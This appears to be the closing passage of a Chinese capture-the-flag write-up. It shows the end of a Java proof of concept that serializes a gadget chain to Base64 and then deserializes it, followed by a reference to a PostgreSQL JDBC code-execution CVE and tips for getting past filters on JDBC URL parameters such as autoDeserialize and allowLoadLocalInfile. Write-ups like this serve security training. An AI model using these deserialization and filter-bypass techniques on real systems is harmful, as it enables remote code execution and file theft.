//        HashMap gadgetChain = new HashMap();
//        gadgetChain.put(map1,"");
//        gadgetChain.put(map2,"");

        //序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(gadgetChain);
        oos.close();
        System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())));

        //反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
}
```

最后就是PostgresQL的一个cve了：[PostgresQL JDBC Drive 任意代码执行漏洞(CVE-2022-21724)](https://xz.aliyun.com/t/11812)
也可以绕过过滤，使用url编码绕过`jdbc:mysql`，大写绕过`autoDeserialize=true`和`allowLoadLocalInfile=true`

参考：
[[分享]2022第五届“安洵杯”网络安全挑战赛官方WP](https://bbs.pediy.com/thread-275369.htm)